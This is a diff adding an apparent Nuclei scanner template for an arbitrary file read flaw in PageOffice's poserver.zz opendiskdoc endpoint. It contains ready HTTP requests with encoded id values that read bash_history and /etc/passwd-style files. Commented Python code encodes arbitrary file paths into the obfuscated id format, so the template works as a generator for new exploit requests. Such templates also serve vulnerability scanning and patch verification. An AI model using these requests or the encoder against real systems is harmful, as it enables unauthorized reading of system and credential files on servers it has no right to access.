@@ -1,0 +1,95 @@
+id: PageOffice-poserver-zz-fileread
+
+info:
+  name: PageOffice-poserver.zz-fileread 任意文件下载
+  author: qwtd
+  severity: high
+  description: |-
+    PageOffice poserver接口opendiskdoc方法存在文件读取漏洞
+    KmcgY3MtJm0lcmUsFl85ZhVmL3E4bSZ3amQvaitsF2srO2ckKW0icitsOHI/bis7OGM8cg== 读取bash_history
+    加解密脚本看源文件注释内容
+  reference:
+    - https://stack.chaitin.com/vuldb/detail/7512f165-b515-477e-8979-f02125775ed2
+  tags: PageOffice
+
+http:
+  - raw:
+      - |
+        GET /poserver.zz?pgop=opendiskdoc&id=KmcgY3MtK3IpLSRfOXE9YmpkL2orbBdrKztnJCltInIrbDhyP24rOzhjPHI= HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /poserver.zz?pgop=opendiskdoc&id=KmcgY3N1L2xiZyJnamQvaitsF2srO2ckKW0icitsOHI-Sbis7OGM8cmphJWw4YyJyOHckY3NfJG4gZylfOGclbGVtKXIrcmNxOHArXyMkKmcgYyJfI2NzdS9sYmciZ2pkL2orbBdrKztnJCltInIrbDhyP24rOzhjPHI-X HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0"
+
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+
+# python加解密脚本:
+#     import base64
+#     import argparse
+
+#     def custom_encrypt(plain: str) -> str:
+#         b = plain.encode()
+#         res = bytearray(len(b))
+#         for i in range(len(b)):
+#             if i % 2 != 0:
+#                 res[i] = (b[i] - 2) & 0xFF
+#             else:
+#                 res[i] = ((b[i] - 3) ^ 73) & 0xFF
+#         b64 = base64.b64encode(res).decode()
+#         return b64.replace("+", "-A").replace("/", "-S").replace("=", "-X")
+
+#     def custom_decrypt(encoded: str) -> str:
+#         encoded = encoded.replace("-A", "+").replace("-S", "/").replace("-X", "=")
+#         try:
+#             b = base64.b64decode(encoded)
+#         except Exception as e:
+#             return f"[!] Base64 decode error: {e}"
+#         res = bytearray(len(b))
+#         for i in range(len(b)):
+#             if i % 2 != 0:
+#                 res[i] = (b[i] + 2) & 0xFF
+#             else:
+#                 res[i] = ((b[i] ^ 73) + 3) & 0xFF
+#         try:
+#             return res.decode()
+#         except Exception as e:
+#             return f"[!] Decode failed: {e}"
+
+#     def encode_id(real_filepath: str) -> str:
+#         import os
+#         # 模拟 m44h：只取 basename，假设临时文件名就是 basename
+#         tmp_filename = os.path.basename(real_filepath)
+#         filename = tmp_filename
+#         content = f"file={tmp_filename}&contenttype=application/octet-stream&filename={filename}"
+#         return custom_encrypt(content)
+
+#     def main():
+#         parser = argparse.ArgumentParser(description="PageOffice ID 编码/解码工具")
+#         parser.add_argument("--encode", help="输入真实文件路径，生成 id 参数")
+#         parser.add_argument("--decode", help="输入 id 值，解码出原始内容")
+#         args = parser.parse_args()
+
+#         if args.encode:
+#             print("[*] 原始路径:", args.encode)
+#             print("[+] 生成 id:", encode_id(args.encode))
+#         elif args.decode:
+#             print("[*] 待解码 id:", args.decode)
+#             print("[+] 解码结果:", custom_decrypt(args.decode))
+#         else:
+#             parser.print_help()
+
+#     if __name__ == "__main__":
+#         main()
